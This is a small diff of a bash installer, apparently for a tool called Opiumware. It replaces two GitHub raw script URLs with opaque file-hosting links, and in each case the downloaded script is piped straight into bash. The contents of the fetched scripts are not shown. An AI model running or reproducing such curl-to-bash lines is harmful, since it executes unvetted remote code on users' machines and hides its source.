@@ -4,10 +4,10 @@ main() {
     clear
 
     if [ -w "/Applications" ]; then
-        curl -s "https://raw.githubusercontent.com/devnorb/OpiumwareInstall/refs/heads/main/global.sh" | bash
+        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rgyHsbeTcxWur2zokhiOb0SP1GAgN4HUpD5n9" | bash
     else
         echo -e "${YELLOW}[!] Local user detected, using home directory instead of global directory ${NC}"
-        curl -s "https://raw.githubusercontent.com/devnorb/OpiumwareInstall/refs/heads/main/local.sh" | bash
+        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rFV92WstqDCv8hesH9RxTJg2dLVrS5AFwoYc0" | bash
     fi
 }
 
